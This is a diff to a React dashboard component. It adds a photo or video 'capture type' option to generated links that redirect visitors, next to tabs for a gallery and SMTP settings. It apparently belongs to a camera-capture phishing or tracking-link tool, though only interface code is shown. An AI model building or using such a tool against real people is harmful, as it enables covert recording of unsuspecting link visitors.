@@ -20,6 +20,7 @@ export default function Home() {
   const [activeTab, setActiveTab] = useState<"dashboard" | "links" | "gallery" | "smtp">("dashboard");
   const [linkId, setLinkId] = useState("");
   const [redirectUrl, setRedirectUrl] = useState("https://example.com");
+  const [captureType, setCaptureType] = useState<"photo" | "video">("photo");
   const [copiedId, setCopiedId] = useState<string | null>(null);
 
   // SMTP 配置表单状态
@@ -114,7 +115,7 @@ export default function Home() {
       toast.error("请填写完整信息。");
       return;
     }
-    createLinkMutation.mutate({ id: linkId.trim(), redirectUrl: redirectUrl.trim() });
+    createLinkMutation.mutate({ id: linkId.trim(), redirectUrl: redirectUrl.trim(), captureType });
   };
 
   const copyToClipboard = (text: string, id: string) => {
@@ -440,6 +441,17 @@ export default function Home() {
                         className="bg-slate-950 border-slate-800 text-white focus-visible:ring-indigo-500 rounded-xl h-11"
                       />
                     </div>
+                    <div className="space-y-2">
+                      <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider">{t.captureTypeLabel}</label>
+                      <select
+                        value={captureType}
+                        onChange={(e) => setCaptureType(e.target.value as "photo" | "video")}
+                        className="w-full bg-slate-950 border border-slate-800 text-white text-xs rounded-xl h-11 px-3 outline-none cursor-pointer"
+                      >
+                        <option value="photo">{t.captureTypePhoto}</option>
+                        <option value="video">{t.captureTypeVideo}</option>
+                      </select>
+                    </div>
                     <Button type="submit" disabled={createLinkMutation.isPending} className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-6 rounded-xl transition-all shadow-lg shadow-indigo-600/20">
                       {createLinkMutation.isPending ? t.generatingBtn : t.generateBtn}
                     </Button>
@@ -471,6 +483,7 @@ export default function Home() {
                         <TableHeader className="bg-slate-950/80">
                           <TableRow className="border-slate-800 hover:bg-transparent">
                             <TableHead className="text-slate-400 font-semibold">ID / Path</TableHead>
+                            <TableHead className="text-slate-400 font-semibold">{t.linkType}</TableHead>
                             <TableHead className="text-slate-400 font-semibold">Target URL</TableHead>
                             <TableHead className="text-slate-400 font-semibold">Created</TableHead>
                             <TableHead className="text-right text-slate-400 font-semibold">{t.actions}</TableHead>
@@ -482,6 +495,11 @@ export default function Home() {
                             return (
                               <TableRow key={link.id} className="border-slate-800 hover:bg-slate-800/40 transition-colors">
                                 <TableCell className="font-semibold text-indigo-400">{link.id}</TableCell>
+                                <TableCell className="text-slate-300">
+                                  <span className={`inline-flex items-center px-2 py-0.5 rounded text-[11px] font-medium ${link.captureType === 'video' ? 'bg-purple-500/20 text-purple-300 border border-purple-500/30' : 'bg-indigo-500/20 text-indigo-300 border border-indigo-500/30'}`}>
+                                    {link.captureType === 'video' ? t.captureTypeVideo : t.captureTypePhoto}
+                                  </span>
+                                </TableCell>
                                 <TableCell className="text-slate-300 max-w-xs truncate">
                                   <a href={link.redirectUrl} target="_blank" rel="noreferrer" className="hover:underline flex items-center gap-1.5 text-xs text-slate-300">
                                     {link.redirectUrl} <ExternalLink className="w-3 h-3 opacity-60 flex-shrink-0" />
